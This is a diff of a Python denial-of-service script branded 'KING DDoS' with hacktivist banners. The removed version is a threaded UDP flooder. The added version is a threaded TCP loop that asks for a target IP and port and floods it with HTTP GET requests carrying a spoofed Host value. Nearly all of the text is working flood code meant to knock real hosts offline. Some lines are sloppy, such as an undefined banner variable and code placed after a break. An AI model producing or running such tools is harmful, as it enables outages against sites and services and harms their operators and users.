@@ -1,98 +1,101 @@
+#!/usr/bin/python3
+import os
 import socket
 import threading
-import os
-import sys
 import time
-import random
-
-# Clear terminal screen
-os.system('clear')
-
-# Function to display banner
-def display_banner():
-  logo = """
-         ÷÷÷     ÷÷    ÷÷÷    ÷÷÷÷        ÷÷      ÷÷÷ ÷÷ 
-         ÷÷÷    ÷÷     ÷÷÷    ÷÷÷ ÷÷      ÷÷    ÷÷÷     ÷÷
-         ÷÷÷   ÷÷      ÷÷÷    ÷÷÷  ÷÷     ÷÷   ÷÷÷
-         ÷÷÷  ÷÷       ÷÷÷    ÷÷÷   ÷÷    ÷÷   ÷÷÷ ÷÷ ÷÷ ÷÷
-         ÷÷÷  ÷÷       ÷÷÷    ÷÷÷    ÷÷   ÷÷   ÷÷÷       ÷÷
-         ÷÷÷   ÷÷      ÷÷÷    ÷÷÷     ÷÷  ÷÷   ÷÷÷       ÷÷
-         ÷÷÷    ÷÷     ÷÷÷    ÷÷÷      ÷÷ ÷÷    ÷÷÷     ÷÷
-         ÷÷÷     ÷÷    ÷÷÷    ÷÷÷        ÷÷÷      ÷÷÷ ÷÷ 
-
-≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈
-||
-\033[31m         BAR-BAR  FIGHTERS  FOR  FREE  PALESTINE
-\033[33m             BRRIH BIDDAM NAFDHIKA YAA AQSHA
-\033[32m                       KING SCRIP 
-\033[97m                        ——oOOo——
-||
-≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈
-"""
-    print(banner)
-
-# Prompt user for input
-def get_user_input():
-    print(" +======================================================+")
-    target_ip = input(" | Target IP : ").strip()
-    target_port = input(" | Target Port : ").strip()
-    attack_time = input(" | Time (seconds) : ").strip()
-    packet = input(" | Packet : ").strip()
-    thread_count = input(" | Thread : ").strip()
-    method = input(" | Method (UDP/TCP & UDP Mix) : ").strip().lower()
-    print(" ========================================================")
-
-    return target_ip, int(target_port), int(attack_time), int(packet), int(thread_count), method
-
-# Display input summary after user provides inputs
-def display_input_summary(target_ip, target_port, attack_time, packet, thread_count, method):
-    display_banner()  # Show the banner again
-    print(" +======================================================+")
-    print(f" | Target IP : {target_ip:<40}|")
-    print(f" | Target Port : {target_port:<40}|")
-    print(f" | Time : {attack_time:<40}|")
-    print(f" | Packet : {packet:<45}|")
-    print(f" | Thread : {thread_count:<45}|")
-    print(f" | Method (UDP/TCP & UDP Mix) : {method:<25}|")
-    print(" ========================================================")
-
-# UDP attack function
-def udp_attack(ip, port, packet, duration, thread_count):
-    timeout = time.time() + duration
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    data = random._urandom(1024)
-
-    while time.time() < timeout:
+from colorama import Fore, Style
+def ddos():
+    os.system("clear")
+    print("press CTRL + C and press ENTER to exit !!!")
+    while True:
         try:
-            for _ in range(packet):
-                s.sendto(data, (ip, port))
-            print(f"[KING_DD0S]  \033[33mAttacking  time  \033[37m{duration} target \033[92m{ip}:{port} packet \033[93m{packet} threads {thread_count}\033[0m")
-        except socket.error:
-            s.close()
-            print("[KING_DD0S] Error during attack, socket closed.")
-            break
+            threads = int(input("ENTER NUMBER OF THREADS : "))
+        except ValueError:
+            print("please enter a integer value")
+            continue;
+        else:
+            break;
+    attack_num = 0
+    trget = str(input(Fore.RED + Style.BRIGHT + "ENTER IP OF THE HOST :  "))
+    fake = '192.178.1.38'
+    #port = 80( default http port is 80)
+    while True:
+        try:
+            port = int(input("ENTER PORT (default port : 80 ) : ") or 80)
+        except ValueError:
+            print("Please enter a valid port , please try again")
+            continue;
+        else:
+            break;
+    print(f"performing Ddos on {trget} on PORT {port} using FAKE IP {fake} ")
+    print(Fore.YELLOW + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " if the above information is incorrect,you can restart the script and again enter the details correctly!!")
+   # print(Fore.YELLOW + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " Press CTRL + C and press Enter to Exit!")
+    #print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" + Fore.WHITE + "Press CTRL + C and press enter to exit!!")
+    time.sleep(4)
+    print(Fore.MAGENTA + Style.BRIGHT + "DDos starting in ~")
+    print("seconds : 3")
+    time.sleep(1)
+    print("seconds : 2")
+    time.sleep(1)
+    print("seconds : 1")
+    time.sleep(1)
 
-# Threaded attack function
-def start_attack(target_ip, target_port, packet, thread_count, method, duration):
-    if method == 'udp':
-        for _ in range(thread_count):
-            th = threading.Thread(target=udp_attack, args=(target_ip, target_port, packet, duration, thread_count))
-            th.start()
+    def attack():
+        nonlocal attack_num
+        while True:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((trget, port))
+                s.sendto(("GET /" + trget + " HTTP/1.1\r\n").encode("ascii"), (trget, port))
+                s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
+
+                attack_num += 1
+                print("[💥]  \033[94mTHE KING  \033[93mBAR-BAR  \033[32mAttack number \033[97m——> \033[0m"+ str(attack_num))
+            except socket.error:
+                print('CONNECTION FAILED, HOST MAY BE DOWN OR CHECK IP OR PORT')
+                break
+                s.close()
+
+    for i in range(threads):
+        thread = threading.Thread(target=attack)
+        thread.start()
+def print_red_centered_art():
+    os.system("clear")
+    art = '''
+   :::     ::   :::   ::::         ::      ::: :: ::
+   :::    ::    :::   ::: ::       ::    :::        ::
+   :::   ::     :::   :::  ::      ::   :::
+   :::  ::      :::   :::   ::     ::   :::
+   ::: ::       :::   :::    ::    ::   ::: :: :: ::
+   :::  ::      :::   :::     ::   ::   :::         ::
+   :::   ::     :::   :::      ::  ::   :::         ::
+   :::    ::    :::   :::       :: ::    :::        ::
+   :::     ::   :::   :::        ::::      ::: :: ::  '''
+
+    red_art = f"{Fore.YELLOW}{art}{Style.RESET_ALL}"  # Set the text color to red
+    print(red_art.center(80))  # Adjust the width (80 characters) to match your terminal size
+    #red_art2 = f"{Fore.RED}{art2}{Style.RESET_ALL}"
+    red_art2 = f"{Fore.YELLOW}{Style.RESET_ALL}"
+    print((80))
+    print(Fore.YELLOW + Style.BRIGHT + "[KING's dedication and struggle for PALESTINE]")
+if __name__ == "__main__":
+    print_red_centered_art()
+def menu():
+   # print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" Fore.WHITE + "Press CTRL + C and press enter to exit!!")
+    print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" + Fore.BLUE + "Press CTRL + C and press enter to exit!!")
+    print(Fore.WHITE + Style.BRIGHT + "——————————————————————————————————————————————————————————————————")
+    print(Fore.YELLOW + Style.BRIGHT + "Silahkan ketik 1 untuk melanjutkan...")
+    print(Fore.BLUE + Style.BRIGHT + "1. DDos a website.  [1]")
+    print(Fore.WHITE + Style.BRIGHT + "2. exit.            [2]")
+    print("Enter your options .. [e.g 1,2]") 
+    global usr
+    usr = input(Fore.YELLOW + Style.BRIGHT + "0======>> " )
+    if usr == "1":
+        ddos()
+    elif usr == "2":
+        print("Exiting...")
+        time.sleep(1)
     else:
-        print("[KING_DD0S] Unsupported method. Only UDP supported in this version.")
-
-# Main program flow
-def main():
-    display_banner()  # Show the banner initially
-    target_ip, target_port, attack_time, packet, thread_count, method = get_user_input()
-    display_input_summary(target_ip, target_port, attack_time, packet, thread_count, method)
-
-    # Start attack
-    start_attack(target_ip, target_port, packet, thread_count, method, attack_time)
-
-if __name__ == '__main__':
-    try:
-        main()
-    except KeyboardInterrupt:
-        print("\n[KING-DD0S] Attack interrupted. Exiting...")
-        sys.exit()
+        print("invalid option..try again.")
+        menu()
+menu()
